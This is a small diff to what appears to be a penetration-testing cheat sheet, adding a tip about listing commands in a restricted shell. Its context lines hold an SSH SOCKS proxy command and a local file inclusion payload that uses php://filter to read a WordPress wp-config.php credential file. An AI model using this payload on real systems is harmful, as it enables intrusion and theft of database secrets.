@@ -85,3 +85,6 @@ Over Socks 5: ssh -D PORT [USER]@[IP]
 ## Force the server to read and encode the file before processed
 Example (with LFI, wp file) 
 http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+
+## Check commands in a restricted shell
+<TAB><TAB>
